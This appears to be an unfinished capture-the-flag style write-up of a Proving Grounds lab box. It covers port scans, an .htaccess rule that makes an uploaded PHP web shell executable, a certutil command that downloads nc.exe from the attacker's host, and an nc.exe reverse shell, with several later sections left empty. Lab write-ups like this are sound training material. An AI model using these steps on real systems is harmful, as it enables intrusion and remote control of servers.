---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan2.txt --open 192.168.213.187
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 22:18 +0900
Nmap scan report for 192.168.213.187
Host is up (0.079s latency).
Not shown: 65279 closed tcp ports (reset), 229 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49701/tcp open  unknown
49782/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.15 seconds

```

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ sudo nmap -Pn -p80 -sSCV -A -oN full_tcp-scan.txt --open 192.168.213.187
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 22:20 +0900
Nmap scan report for 192.168.213.187
Host is up (0.077s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|2012|2022|11|2016 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows 11 24H2 - 25H2 (88%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   76.88 ms 192.168.45.1
2   76.86 ms 192.168.45.254
3   77.26 ms 192.168.251.1
4   77.33 ms 192.168.213.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
```

http://192.168.213.187/

![[Pasted image 20260709222341.png]]

![[Pasted image 20260709223150.png]]

![[Pasted image 20260709222755.png]]
![[Pasted image 20260709222736.png]]

*But aspx was not execute*

![[Pasted image 20260709223305.png]]

![[Pasted image 20260709223231.png]]

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ cat ../.htaccess                
AddType application/x-httpd-php .evil
```

![[Pasted image 20260709223409.png]]

https://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=whoami

![[Pasted image 20260709224045.png]]

http://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=certutil%20-urlcache%20-split%20-f%20http://192.168.45.167/nc.exe%20nc.exe

![[Pasted image 20260709225623.png]]

http://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=.\nc.exe%20192.168.45.167%20443%20-e%20cmd.exe

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.213.187] 50079
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>
```

![[Pasted image 20260709225906.png]]

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>